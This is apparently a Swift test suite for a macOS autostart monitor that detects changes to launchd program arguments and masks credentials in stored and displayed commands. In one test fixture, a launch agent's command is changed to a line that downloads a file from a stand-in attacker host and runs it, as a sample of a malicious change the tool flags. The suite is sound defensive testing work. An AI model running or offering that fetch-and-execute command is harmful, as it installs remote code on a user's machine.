import Foundation
import Testing
@testable import ManagerKit
import TestSupport

/// #137: Änderungen an `ProgramArguments` werden erkannt, maskiert gespeichert und verständlich angezeigt.
@Suite struct AutostartArgumentsTests {
    private let differ = SnapshotDiffer()
    private let later = TestData.date.addingTimeInterval(60)
    private let fingerprinter = SecretFingerprinter.ephemeral()

    /// Launchd-Eintrag, der `/bin/sh` mit `arguments` startet – maskiert wie in `LaunchdSource`.
    private func shellItem(_ arguments: [String], fingerprinter: SecretFingerprinter? = nil) -> AutostartItem {
        var item = TestData.item("com.example.agent")
        let masked = MaskedCommand(program: "/bin/sh", arguments: arguments, fingerprinter: fingerprinter ?? self.fingerprinter)
        item.program = masked.program
        item.programArguments = masked.arguments
        item.programArgumentsFingerprint = masked.fingerprint
        item.launchesInterpreter = true
        return item
    }

    private func events(from old: AutostartItem, to new: AutostartItem) -> [ChangeEvent] {
        differ.diff(from: TestData.snapshot(items: [old]), to: TestData.snapshot(items: [new], at: later))
    }

    // MARK: Reine Argumentänderung

    @Test func pureArgumentChangeIsReportedDespiteSameInterpreter() throws {
        let old = shellItem(["/bin/sh", "-c", "echo A"])
        let new = shellItem(["/bin/sh", "-c", "curl -s https://evil.example -o /tmp/x && /tmp/x"])

        let events = events(from: old, to: new)
        #expect(events == [ChangeEvent(kind: .modified, before: .autostartItem(old), after: .autostartItem(new), detectedAt: later)])
        #expect(!TestData.snapshot(items: [old]).isEquivalent(to: TestData.snapshot(items: [new])))
        let event = try #require(events.first)
        #expect(ChangeDescription(event).body == "com.example.agent (LaunchAgent): Befehl geändert.")
        #expect(event.commandChange == CommandChange(before: "/bin/sh -c 'echo A'",
                                                     after: "/bin/sh -c 'curl -s https://evil.example -o /tmp/x && /tmp/x'"))
    }

    @Test func pureArgumentChangeAppearsAsModifiedInObservationBalance() {
        let old = shellItem(["/bin/sh", "-c", "A"])
        let new = shellItem(["/bin/sh", "-c", "B"])
        let balance = ObservationBalance(baseline: TestData.snapshot(items: [old]), final: TestData.snapshot(items: [new], at: later))
        #expect(balance.groups[.modified]?.count == 1)
    }

    @Test func argumentChangeMakesObservedItemAnotherItem() {
        let old = shellItem(["/bin/sh", "-c", "A"])
        #expect(ObservationCleanupOffer.isSameAutostartItem(old, old))
        #expect(!ObservationCleanupOffer.isSameAutostartItem(old, shellItem(["/bin/sh", "-c", "B"])))
    }

    // MARK: Unveränderte Argumente

    @Test func unchangedArgumentsProduceNoEvent() {
        let item = shellItem(["/bin/sh", "-c", "echo A"])
        let rescanned = shellItem(["/bin/sh", "-c", "echo A"])
        #expect(events(from: item, to: rescanned).isEmpty)
        #expect(TestData.snapshot(items: [item]).isEquivalent(to: TestData.snapshot(items: [rescanned])))
    }

    @Test func unchangedSecretArgumentsProduceNoEvent() {
        let arguments = ["/bin/sh", "-c", "export API_TOKEN=s3cr3t-value && run"]
        let item = shellItem(arguments)
        #expect(events(from: item, to: shellItem(arguments)).isEmpty)
        #expect(TestData.snapshot(items: [item]).isEquivalent(to: TestData.snapshot(items: [shellItem(arguments)])))
    }

    // MARK: Ältere Snapshots

    @Test func olderSnapshotWithoutArgumentsDecodes() throws {
        let item = shellItem(["/bin/sh", "-c", "A"])
        var object = try #require(JSONSerialization.jsonObject(with: JSONEncoder().encode(item)) as? [String: Any])
        object["programArguments"] = nil
        object["programArgumentsFingerprint"] = nil
        let decoded = try JSONDecoder().decode(AutostartItem.self, from: JSONSerialization.data(withJSONObject: object))
        #expect(decoded.programArguments == nil && decoded.programArgumentsFingerprint == nil)
        #expect(decoded.commandLine == nil)
        #expect(try JSONDecoder().decode(AutostartItem.self, from: JSONEncoder().encode(item)) == item)
    }

    @Test func firstScanAfterUpdateReportsNoChangeButIsStored() {
        var legacy = shellItem(["/bin/sh", "-c", "A"])
        legacy.programArguments = nil
        legacy.programArgumentsFingerprint = nil
        let current = shellItem(["/bin/sh", "-c", "export TOKEN=abc && run"])

        #expect(events(from: legacy, to: current).isEmpty)
        // Gespeichert wird trotzdem, sonst bliebe der Vergleichsstand ohne Argumente und spätere Änderungen unerkannt.
        #expect(!TestData.snapshot(items: [legacy]).isEquivalent(to: TestData.snapshot(items: [current])))
    }

    /// Vor #137 stand `program` (argv[0]) roh im Snapshot; heute maskiert. Der erste Scan danach meldet nichts.
    @Test func legacyRawProgramIsComparedWithTodaysMasking() {
        var legacy = TestData.item("com.example.agent")
        legacy.program = "https://user:hunter2@host/service"
        var current = legacy
        let masked = MaskedCommand(program: nil, arguments: [legacy.program!, "--verbose"], fingerprinter: fingerprinter)
        current.program = masked.program
        current.programArguments = masked.arguments
        current.programArgumentsFingerprint = masked.fingerprint
        #expect(current.program == "https://user:•••@host/service")
        #expect(events(from: legacy, to: current).isEmpty)
        #expect(!TestData.snapshot(items: [legacy]).isEquivalent(to: TestData.snapshot(items: [current])))
        var moved = current
        moved.program = "/usr/local/bin/other"
        #expect(events(from: legacy, to: moved).map(\.kind) == [.modified])
    }

    @Test func otherChangesOfLegacyItemAreStillReported() {
        var legacy = shellItem(["/bin/sh", "-c", "A"])
        legacy.programArguments = nil
        var current = shellItem(["/bin/sh", "-c", "A"])
        current.isEnabled = false
        #expect(events(from: legacy, to: current).map(\.kind) == [.modified])
    }

    // MARK: Geheimnismaskierung

    @Test func secretsInArgumentsAreMaskedBeforePersistenceAndDisplay() async throws {
        let secret = "ghp_abcdefghijklmnop1234567890"
        let plists: [String: [String: Any]] = [
            "agent.plist": ["Label": "agent", "ProgramArguments": [
                "/usr/local/bin/agent", "--password", "hunter2", "--token=\(secret)", "plain",
            ]],
        ]
        let item = try await collect(plists, fingerprinter: fingerprinter).first
        let collected = try #require(item)

        #expect(collected.commandLine == "/usr/local/bin/agent --password ••• --token=••• plain")
        #expect(collected.programArgumentsFingerprint != nil)
        #expect(collected.commandNote == MaskedCommandNote.maskedValues)
        let encoded = String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [collected])), as: UTF8.self)
        #expect(!encoded.contains(secret) && !encoded.contains("hunter2"))
        let event = ChangeEvent(kind: .added, before: nil, after: .autostartItem(collected), detectedAt: later)
        #expect(!ChangeDescription(event).body.contains(secret))
    }

    @Test func changedHiddenScriptIsReportedWithoutStoringIt() throws {
        let old = shellItem(["/bin/sh", "-c", "export API_TOKEN=first-secret && run"])
        let new = shellItem(["/bin/sh", "-c", "export API_TOKEN=second-secret && run"])
        #expect(old.programArguments == ["/bin/sh", "-c", ArgumentRedactor.mask])
        #expect(old.programArguments == new.programArguments)

        let event = try #require(events(from: old, to: new).first)
        #expect(ChangeDescription(event).body == "com.example.agent (LaunchAgent): maskierte Zugangsdaten im Befehl geändert.")
        // Die Zeilen wären gleich – keine leere Vorher/Nachher-Darstellung.
        #expect(event.commandChange == nil)
        let encoded = String(decoding: try JSONEncoder().encode(event), as: UTF8.self)
        #expect(!encoded.contains("first-secret") && !encoded.contains("second-secret"))
    }

    @Test func fingerprintsOfDifferentKeysAreNotCompared() {
        let arguments = ["/bin/sh", "-c", "export API_TOKEN=s3cr3t && run"]
        let old = shellItem(arguments, fingerprinter: .ephemeral())
        let new = shellItem(arguments, fingerprinter: .ephemeral())
        // Neuer Schlüssel (Datei verloren): keine Meldung, aber gespeichert.
        #expect(events(from: old, to: new).isEmpty)
        #expect(!TestData.snapshot(items: [old]).isEquivalent(to: TestData.snapshot(items: [new])))
    }

    @Test func argumentsWithoutMaskingCarryNoFingerprint() {
        #expect(MaskedCommand(program: nil, arguments: ["/bin/sh", "-c", "echo A"], fingerprinter: fingerprinter).fingerprint == nil)
        #expect(MaskedCommand(program: nil, arguments: ["/usr/bin/x", "--token", "abc"], fingerprinter: fingerprinter).fingerprint != nil)
    }

    // MARK: Shell-Skripte: ganz oder gar nicht

    /// Skripte mit Geheimnis-Indikator oder unlesbarem Konstrukt stehen nur als `•••` im Modell – egal, wie Operatoren,
    /// Redirections oder Verschachtelung sie zerlegen würden (Codex-Befunde #137, Runde 1 und 2).
    @Test(arguments: [
        "true&&API_TOKEN=hunter2 /usr/bin/env",
        "false||API_TOKEN=hunter2 run",
        "echo x|API_TOKEN=hunter2 run",
        "true;API_TOKEN=hunter2 run",
        "run --password</dev/null hunter2",
        "run --password>/tmp/log hunter2",
        "run --password 2>/dev/null hunter2",
        "bash -c 'API=${TOKEN:-hunter2} run'",
        "run --x $(echo hunter2)",
        "run `cat hunter2`",
        "API=${X:-hunter2} run",
        "cat <<EOF\nhunter2\nEOF",
        "echo 'hunter2",
        "run --pa\"\"ssword hunter2",
        "curl https://user:hunter2@host/x",
        "export GH_PAT=hunter2",
        "run ghp_abcdefghijklmnop1234567890",
        // Codex Runde 3: Webhook-Pfad (Regel des Redactors) und Zeilenfortsetzung.
        "curl https://hooks.slack.com/services/T000/B000/hunter2",
        "curl -X POST https://discord.com/api/webhooks/1/hunter2",
        "run --to\\\nken hunter2",
        "run --to\\\r\nken hunter2",
        "psql 'Server=db;Password=hunter2'",
    ])
    func scriptsWithIndicatorsAreHiddenEntirely(script: String) async throws {
        let plists: [String: [String: Any]] = ["agent.plist": ["Label": "agent", "ProgramArguments": ["/bin/sh", "-c", script]]]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        #expect(item.commandLine == "/bin/sh -c •••")
        #expect(item.programArgumentsFingerprint != nil)
        #expect(item.commandNote == MaskedCommandNote.hiddenScript)
        let encoded = String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self)
        #expect(!encoded.contains("hunter2") && !encoded.contains("ghp_"))
        // Dieselbe Regel für MCP-Server (Befehl und Argumente als eine Liste).
        #expect(ArgumentRedactor.redact(arguments: ["bash", "-c", script]).values == ["bash", "-c", ArgumentRedactor.mask])
    }

    /// Codex Runde 3 wörtlich: Der Webhook-Pfad trägt keinen Namensbestandteil – erkannt wird er nur, weil die
    /// Skriptprüfung den gesamten Redactor über jede Lesart laufen lässt. Die Zeilenfortsetzung ist ein unsicheres
    /// Konstrukt.
    @Test(arguments: [
        "curl https://hooks.slack.com/services/T000/B000/XXXX",
        "run --to\\\nken XXXX",
    ])
    func codexRoundThreeScriptsAreHidden(script: String) async throws {
        let plists: [String: [String: Any]] = ["agent.plist": ["Label": "agent", "ProgramArguments": ["/bin/sh", "-c", script]]]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        #expect(item.programArguments == ["/bin/sh", "-c", ArgumentRedactor.mask])
        let encoded = String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self)
        #expect(!encoded.contains("XXXX") && !encoded.contains("T000"))
        #expect(ArgumentRedactor.redact(arguments: ["sh", "-c", script]).values == ["sh", "-c", ArgumentRedactor.mask])
    }

    @Test func webhookPathIsCaughtOnlyByTheRedactor() {
        let script = "curl https://hooks.slack.com/services/T000/B000/XXXX"
        #expect(!ShellSyntax.secretIndicator(in: script, usingRedactor: false))
        #expect(ShellSyntax.secretIndicator(in: script))
    }

    /// `Program` ist die Shell, `argv[0]` nur ein Prozessname (Codex-Befund 2, Runde 2).
    @Test func scriptIsRecognizedFromProgramKeyNotArgvZero() async throws {
        let plists: [String: [String: Any]] = ["agent.plist": [
            "Label": "agent", "Program": "/bin/sh", "ProgramArguments": ["agent", "-c", "API=${TOKEN:-hunter2} run"],
        ]]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        #expect(item.programArguments == ["agent", "-c", ArgumentRedactor.mask])
        #expect(item.commandLine == "/bin/sh -c •••")
        #expect(!String(decoding: try JSONEncoder().encode(item), as: UTF8.self).contains("hunter2"))
        // Umgekehrt macht ein Prozessname `sh` neben einem anderen Programm nichts zum Skript.
        #expect(ShellSyntax.scriptIndices(in: ["sh", "-c", "x"], program: "/usr/bin/printf").isEmpty)
    }

    @Test(arguments: [
        "echo A",
        "exec \"${HOME}/bin/agent\" --verbose >/tmp/agent.log 2>&1",
        "cd /opt/app && ./run --port 8080 | tee /tmp/out",
    ])
    func scriptsWithoutIndicatorsStayReadable(script: String) {
        #expect(ArgumentRedactor.redact(arguments: ["/bin/sh", "-c", script]).values == ["/bin/sh", "-c", script])
        #expect(!ArgumentRedactor.redact(arguments: ["/bin/sh", "-c", script]).containsSecret)
    }

    /// Hinter einem Shell-Interpreter zählt jedes Argument bis zum Ende als mögliches Skript – ohne Optionsauswertung.
    @Test func everyArgumentAfterAShellIsCheckedAsScript() {
        #expect(ShellSyntax.scriptIndices(in: ["/usr/bin/env", "bash", "-o", "pipefail", "-ec", "x"]) == [2, 3, 4, 5])
        #expect(ShellSyntax.scriptIndices(in: ["/usr/bin/sudo", "-u", "nobody", "/bin/sh", "-c", "x"]) == [4, 5])
        #expect(ShellSyntax.scriptIndices(in: ["/bin/zsh", "-l", "-c", "x", "name"]) == [1, 2, 3, 4])
        #expect(ShellSyntax.scriptIndices(in: ["/bin/bash", "-oc", "pipefail", "x"]) == [1, 2, 3])
        #expect(ShellSyntax.scriptIndices(in: ["/bin/bash", "script.sh", "x"]) == [1, 2])
        #expect(ShellSyntax.scriptIndices(in: ["agent", "x"], program: "/bin/sh") == [1])
        #expect(ShellSyntax.scriptIndices(in: ["/bin/sh"]).isEmpty)
        #expect(ShellSyntax.scriptIndices(in: ["/usr/bin/python3", "-c", "x"]) == [1, 2])
    }

    /// Codex Runde 4: Die `c`-Option steht in einem Cluster mit `o`; `pipefail` ist ihr Wert, das Skript folgt danach.
    @Test(arguments: [
        ["/bin/bash", "-oc", "pipefail", "true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN"],
        ["/bin/bash", "-o", "pipefail", "-c", "true&&API_TOKEN=XXXX run"],
        ["/bin/bash", "-euc", "export SECRET=XXXX; run"],
        ["/bin/bash", "-ce", "run --password XXXX"],
        ["/bin/bash", "-c", "run", "name", "--token", "XXXX"],
        ["/bin/bash", "--", "-c", "API_TOKEN=XXXX run"],
        // Codex Runde 5: Ziffern im Cluster, `+o`, Skriptdatei mit Flag.
        ["/bin/zsh", "-c5", "true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN"],
        ["/bin/zsh", "-5c", "true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN"],
        ["/bin/bash", "+o", "posix", "-c", "true&&API_TOKEN=XXXX run"],
        ["/bin/bash", "script.sh", "--token", "XXXX"],
    ])
    func shellCallsWithCommandOptionsNeverLeakScripts(arguments: [String]) async throws {
        let plists: [String: [String: Any]] = ["agent.plist": ["Label": "agent", "ProgramArguments": arguments]]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        let encoded = String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self)
        #expect(!encoded.contains("XXXX"))
        #expect(item.commandLine?.contains("XXXX") == false)
        #expect(item.programArguments?.contains(ArgumentRedactor.mask) == true)
        #expect(!ArgumentRedactor.redact(arguments: arguments).values.joined().contains("XXXX"))
    }

    /// Codex Runde 6: `/bin/SH` startet auf case-insensitivem APFS dieselbe Shell – als `argv[0]` wie als `Program`.
    @Test(arguments: [
        (nil, ["/bin/SH", "-c", "true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN"]),
        ("/bin/SH", ["agent", "-c", "true&&API_TOKEN=XXXX run"]),
        (nil, ["/usr/bin/env", "BASH", "-c", "API_TOKEN=XXXX run"]),
    ] as [(String?, [String])])
    func shellNamesAreComparedCaseInsensitively(program: String?, arguments: [String]) async throws {
        var plist: [String: Any] = ["Label": "agent", "ProgramArguments": arguments]
        plist["Program"] = program
        let item = try #require(try await collect(["agent.plist": plist], fingerprinter: fingerprinter).first)
        #expect(item.commandLine?.contains("XXXX") == false)
        #expect(!String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self).contains("XXXX"))
    }

    /// Ein Symlink mit neutralem Namen auf eine Shell wird über den aufgelösten Pfad erkannt.
    @Test func shellBehindASymlinkIsRecognized() async throws {
        try await ScratchDirectory.with(prefix: "shell-link") { directory in
            let link = directory.appending(path: "mysh")
            try FileManager.default.createSymbolicLink(at: link, withDestinationURL: URL(filePath: "/bin/sh"))
            let plists: [String: [String: Any]] = [
                "agent.plist": ["Label": "agent", "ProgramArguments": [link.path, "-c", "true&&API_TOKEN=XXXX run"]],
            ]
            let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
            #expect(item.programArguments?.last == ArgumentRedactor.mask)
            #expect(item.commandLine?.contains("XXXX") == false)
            #expect(!String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self).contains("XXXX"))
        }
    }

    /// Ohne auflösbaren Pfad zählt wie bisher der Name allein.
    @Test func unresolvableProgramFallsBackToItsName() {
        #expect(LaunchdSource.resolvedPath("relative/sh") == nil)
        #expect(ShellSyntax.scriptIndices(in: ["/fehlt/zsh", "-c", "x"], resolvingPath: { _ in nil }) == [1, 2])
    }

    /// Codex Runde 7: Shell hinter `env` – als Symlink oder in einem Split-String (`env -S`).
    @Test func shellsBehindEnvAreRecognized() async throws {
        try await ScratchDirectory.with(prefix: "shell-link") { directory in
            let link = directory.appending(path: "mysh")
            try FileManager.default.createSymbolicLink(at: link, withDestinationURL: URL(filePath: "/bin/sh"))
            let cases: [[String]] = [
                ["/usr/bin/env", link.path, "-c", "true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN"],
                ["/usr/bin/env", "-S", "sh -c 'true&&API_TOKEN=XXXX /usr/bin/printenv API_TOKEN'"],
                ["/usr/bin/env", "-S", "bash -c \"true&&API_TOKEN=XXXX run\""],
                ["/usr/bin/env", "-S", "/bin/BASH -c true&&API_TOKEN=XXXX"],
            ]
            for arguments in cases {
                let plists: [String: [String: Any]] = ["agent.plist": ["Label": "agent", "ProgramArguments": arguments]]
                let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
                #expect(item.commandLine?.contains("XXXX") == false, "\(arguments)")
                let encoded = String(decoding: try JSONEncoder().encode(TestData.snapshot(items: [item])), as: UTF8.self)
                #expect(!encoded.contains("XXXX"), "\(arguments)")
            }
        }
    }

    @Test func splitStringWithoutShellStaysOrdinaryArgument() {
        #expect(ShellSyntax.scriptIndices(in: ["/usr/bin/env", "-S", "python3 -u server.py"]).isEmpty)
        #expect(ShellSyntax.scriptIndices(in: ["/usr/bin/env", "-S", "sh -c x", "y"]) == [2, 3])
    }

    @Test(arguments: [
        ["/bin/bash", "-o", "pipefail", "-euc", "cd /opt/app && ./run --port 8080"],
        ["bash", "-c", "cd /x && ./run --port 8080"],
    ])
    func harmlessShellCallsStayReadable(arguments: [String]) {
        #expect(ArgumentRedactor.redact(arguments: arguments).values == arguments)
    }

    /// Außerhalb von Shell-Skripten sind `&&`, `<`, `|` literale Zeichen eines Arguments (#155-Semantik).
    @Test func operatorsOutsideScriptsAreLiteral() {
        #expect(ArgumentRedactor.redact(arguments: ["/usr/bin/x", "a&&b", "<in>", "c|d"]).values == ["/usr/bin/x", "a&&b", "<in>", "c|d"])
        #expect(ArgumentRedactor.redact(arguments: ["npx", "https://h/p?a=1&token=x"]).values == ["npx", "https://h/p?a=•••&token=•••"])
    }

    // MARK: Programm (argv[0])

    @Test func secretInArgvZeroIsMaskedEverywhere() async throws {
        let marker = "hunter2"
        let plists: [String: [String: Any]] = [
            "agent.plist": ["Label": "agent", "ProgramArguments": ["https://user:\(marker)@host/service", "--verbose"]],
        ]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        #expect(item.program == "https://user:•••@host/service")
        #expect(item.commandLine == "https://user:•••@host/service --verbose")
        #expect(item.programArgumentsFingerprint != nil)
        let encoded = String(decoding: try JSONEncoder().encode(item), as: UTF8.self)
        #expect(!encoded.contains(marker))
    }

    @Test func secretInProgramKeyIsMaskedAndItsChangeDetected() {
        let old = MaskedCommand(program: "https://u:first@h/x", arguments: ["x"], fingerprinter: fingerprinter)
        let new = MaskedCommand(program: "https://u:second@h/x", arguments: ["x"], fingerprinter: fingerprinter)
        #expect(old.program == "https://u:•••@h/x" && old.program == new.program && old.arguments == new.arguments)
        #expect(old.fingerprint.flatMap { lhs in new.fingerprint.flatMap { lhs.differs(from: $0) } } == true)
    }

    // MARK: Fingerabdruck

    @Test func fingerprintRespectsArgumentBoundariesAndKey() {
        #expect(fingerprinter.fingerprint(of: ["a b"]) != fingerprinter.fingerprint(of: ["a", "b"]))
        #expect(fingerprinter.fingerprint(of: ["x"]) == fingerprinter.fingerprint(of: ["x"]))
        let other = SecretFingerprinter.ephemeral()
        #expect(other.fingerprint(of: ["x"]).digest != fingerprinter.fingerprint(of: ["x"]).digest)
        #expect(other.fingerprint(of: ["x"]).differs(from: fingerprinter.fingerprint(of: ["x"])) == nil)
    }

    // MARK: Anzeige

    @Test func commandLineUsesProgramAndArgumentsFromArgvOne() {
        var item = shellItem(["sh", "-c", "echo 'hi'"])
        #expect(item.commandLine == "/bin/sh -c 'echo '\\''hi'\\'''")
        item.programArguments = []
        #expect(item.commandLine == "/bin/sh")
        item.program = nil
        item.programArguments = ["/usr/bin/x", ""]
        #expect(item.commandLine == "/usr/bin/x ''")
    }

    @Test func launchdSourceReadsArgumentsEvenWithoutProgramArguments() async throws {
        let plists: [String: [String: Any]] = ["agent.plist": ["Label": "agent", "Program": "/bin/ls"]]
        let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
        #expect(item.programArguments == [] && item.programArgumentsFingerprint == nil)
        #expect(item.commandLine == "/bin/ls")
    }

    @Test(arguments: [false, true])
    func issue173LaunchdPersistsHiddenScriptAndSafeHistory(copy: Bool) async throws {
        try await ScratchDirectory.with { directory in
            let executable = directory.appending(path: "runner")
            if copy {
                try FileManager.default.copyItem(atPath: "/bin/sh", toPath: executable.path)
            } else {
                try FileManager.default.createSymbolicLink(atPath: executable.path, withDestinationPath: "/bin/sh")
            }
            let plists: [String: [String: Any]] = ["agent.plist": [
                "Label": "agent", "Program": executable.path,
                "ProgramArguments": ["neutral-argv-zero", "-c", "true&&API_TOKEN=fixture173 run"],
            ]]
            let item = try #require(try await collect(plists, fingerprinter: fingerprinter).first)
            try FileManager.default.removeItem(at: executable)
            let restored = try JSONDecoder().decode(AutostartItem.self, from: JSONEncoder().encode(item))
            #expect(restored.programArguments == ["neutral-argv-zero", "-c", "•••"])
            #expect(restored.commandNote == MaskedCommandNote.hiddenScript)
            var disabled = restored
            disabled.isEnabled = false
            let event = try #require(events(from: restored, to: disabled).first)
            #expect(!String(decoding: try JSONEncoder().encode(event), as: UTF8.self).contains("fixture173"))
        }
    }

    private func collect(_ plists: [String: [String: Any]], fingerprinter: SecretFingerprinter) async throws -> [AutostartItem] {
        try await ScratchDirectory.with(prefix: "launchd-arguments") { directory in
            for (name, dictionary) in plists {
                let data = try PropertyListSerialization.data(fromPropertyList: dictionary, format: .xml, options: 0)
                try data.write(to: directory.appending(path: name))
            }
            let runner = MockCommandRunner()
            runner.stub("/bin/launchctl print-disabled gui/501", CommandResult(exitCode: 0, stdout: "\n\tdisabled services = {\n\t}\n"))
            runner.stub("/bin/launchctl print gui/501", CommandResult(exitCode: 0, stdout: "gui/501 = {\n\tservices = {\n\t}\n}\n"))
            let source = LaunchdSource(
                directories: [LaunchdDirectory(path: directory.path, kind: .launchAgent, domain: .user, launchctlDomain: "gui/501")],
                runner: runner, resolver: StubAppResolver(), fingerprinter: fingerprinter
            )
            return try await source.collect().autostartItems
        }
    }
}

@Suite struct ShellQuotingTests {
    @Test(arguments: [
        ("plain", "plain"),
        ("/usr/bin/x", "/usr/bin/x"),
        ("--flag=value", "--flag=value"),
        ("•••", "•••"),
        ("", "''"),
        ("a b", "'a b'"),
        ("echo $HOME", "'echo $HOME'"),
        ("a;b", "'a;b'"),
        ("don't", "'don'\\''t'"),
        ("line\nbreak", "'line\nbreak'"),
    ])
    func quotesWordsForTheShell(word: String, expected: String) {
        #expect(ShellQuoting.quoted(word) == expected)
    }

    @Test func commandLineKeepsArgumentBoundaries() {
        #expect(ShellQuoting.commandLine(["/bin/sh", "-c", "a b"]) == "/bin/sh -c 'a b'")
        #expect(ShellQuoting.commandLine(["/bin/sh", "-c", "a", "b"]) == "/bin/sh -c a b")
    }
}
